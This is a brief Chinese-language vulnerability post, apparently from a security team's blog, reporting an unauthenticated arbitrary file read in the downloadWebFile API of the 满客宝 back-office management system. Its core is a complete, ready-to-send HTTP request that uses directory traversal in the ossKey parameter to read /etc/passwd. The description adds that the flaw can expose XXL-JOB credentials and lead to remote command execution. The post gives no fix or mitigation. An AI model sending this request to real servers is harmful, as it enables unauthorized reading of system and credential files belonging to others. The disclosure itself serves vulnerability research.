#  满客宝后台管理系统 downloadWebFile 任意文件读取漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-06 23:59  
  
# 1. 漏洞描述  
  
    满客宝后台管理系统 downloadWebFile 接口存在存在任意文件读取漏洞，未经身份验证的远程攻击者可通过该漏洞读取系统配置文件，获取XXL-JOB账户密码，若XXL-JOB部署在公网，可能会进一步导致后台远程命令执行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKDMdESx1RnpibiaOgWwvy5makFCJibjg8bONgVNqYMxdRItLKB1vEcyEfw/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKqVdHZL0iaoDgLPndNKyLXATmrsPVrhibsibjhv5UGCTDcsibtyN8npyDNg/640?wx_fmt=png&from=appmsg "")  
  
  
  
